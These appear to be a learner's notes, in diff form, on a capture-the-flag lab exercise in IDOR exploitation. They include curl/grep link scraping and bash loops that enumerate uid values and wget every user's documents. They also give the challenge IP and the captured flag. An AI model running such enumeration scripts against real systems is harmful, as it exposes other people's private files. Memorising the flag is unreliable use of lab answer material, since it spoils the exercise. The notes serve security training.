@@ -16,3 +16,68 @@ EXAMPLE:
 
 We see that the files have a predictable naming pattern, as the file names appear to be using the user uid and the month/year as part of the file name, which may allow us to fuzz files for other users. This is the most basic type of IDOR vulnerability and is called static file IDOR. However, to successfully fuzz other files, we would assume that they all start with Invoice or Report, which may reveal some files but not all. So, let's look for a more solid IDOR vulnerability.
 
+However, we must be attentive to the page details during any web pentest and always keep an eye on the source code and page size. If we look at the linked files, or if we click on them to view them, we will notice that these are indeed different files, which appear to be the documents belonging to the employee with uid=2:
+
+EXAMPLE for uid=2:
+
+/documents/Invoice_2_08_2020.pdf
+/documents/Report_2_12_2020.pdf
+
+
+Mass Enumeration: 
+
+We can pick any unique word to be able to grep the link of the file. In our case, we see that each link starts with <li class='pure-tree_link'>, so we may curl the page and grep for this line, as follows:
+
+EXAMPLE: MJBUCKNER@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"
+
+<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
+<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
+
+As we can see, we were able to capture the document links successfully. We may now use specific bash commands to trim the extra parts and only get the document links in the output. However, it is a better practice to use a Regex pattern that matches strings between /document and .pdf, which we can use with grep to only get the document links, as follows:
+
+EXAMPLE: MJBUCKNER@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
+
+/documents/Invoice_3_06_2020.pdf
+/documents/Report_3_01_2020.pdf
+
+FOR loop and wget downlaod script: 
+
+#!/bin/bash
+
+url="http://SERVER_IP:PORT"
+
+for i in {1..10}; do
+        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
+                wget -q $url/$link
+        done
+done
+
+
+CHALLENGE: 94.237.53.146:51217
+
+Question 1 - Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.
+1) open burp
+2) go to http://94.237.53.146:51217 -> enable burp on browser 
+3) click documents and intercept POST request 
+4) send to repeater and hit send for the request 
+5) we see that the uid is set up like uid=1 and the documents are set up like /documents/Invoice_1_09_2021.pdf & /documents/Report_1_10_2021.pdf
+6) lets write our own script like the one in the section -> 
+#!/bin/bash
+
+url="http://$1"
+
+for i in {1..20}; do
+	for link in $(curl -s -X POST "$url/documents.php" -d "uid=$i" | grep -oP "/documents.*?\.[a-z]{3}"); 
+	do
+		wget -q $url$link
+	done
+done
+
+7) i put this in a script named IDOR.sh 
+8) run it with this syntax: bash IDOR.sh 94.237.53.146:51217
+9) once finished youll notice multiple downlaoded files on your desktop -> one sticks out in particular ->
+cat flag_11dfa168ac8eb2958e38425728623c98.txt 
+HTB{4ll_f1l35_4r3_m1n3}
+
+
+
